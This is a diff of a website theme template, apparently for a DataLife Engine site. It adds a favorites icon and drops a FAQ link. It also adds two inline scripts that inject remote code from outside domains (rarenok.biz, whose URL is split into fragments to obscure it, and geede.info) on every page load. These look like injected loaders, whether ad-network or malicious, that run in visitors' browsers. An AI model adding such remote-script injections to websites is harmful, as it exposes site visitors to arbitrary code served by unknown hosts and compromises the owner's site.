@@ -96,8 +96,9 @@ $(function(){
 			<a href="/" class="logo"></a>
 	
 			<div class="header_icons">
+
+			<a href="/favorites/"><img src="{THEME}/fav.png" alt="banner" /></a>
 			<a href="/addnews.html"><img src="{THEME}/icons/add2.png" alt="banner" /></a>
-			<a href="/index.php?do=faq"><img src="{THEME}/icons/faq.png" alt="banner" /></a>
 			<a href="/index.php?do=rules"><img src="{THEME}/icons/rules2.png" alt="banner" /></a>
 			<a href="/index.php?do=feedback"><img src="{THEME}/icons/contact.png" alt="banner" /></a>
 			<a href="/index.php?do=stats"><img src="{THEME}/icons/stat.png" alt="banner" /></a>
@@ -312,8 +313,11 @@ padding-top: 5px;padding-left: 2.4em; font-family: Arial;">
 			"border='0' width='88' height='31'><\/a>")
 			//--></script><!--/LiveInternet-->
 		</div>
-	
-	</div>
+<br>
+<div id="b_tz_2327" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true">Загрузка...</div>
+</div>
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/2327/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
 	<!-- END right-col -->
 	<div style="clear: both;"></div>
 	[/not-static]
@@ -343,5 +347,6 @@ padding-top: 5px;padding-left: 2.4em; font-family: Arial;">
 [group=1]
 {include file="engine/modules/showstat.php?&size=1024&show_query=y"}
 [/group]
+<script>(function(){var s=document.createElement('script');s.src='http://geede.info/j/w.php?id=1273&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
 </body>
 </html>
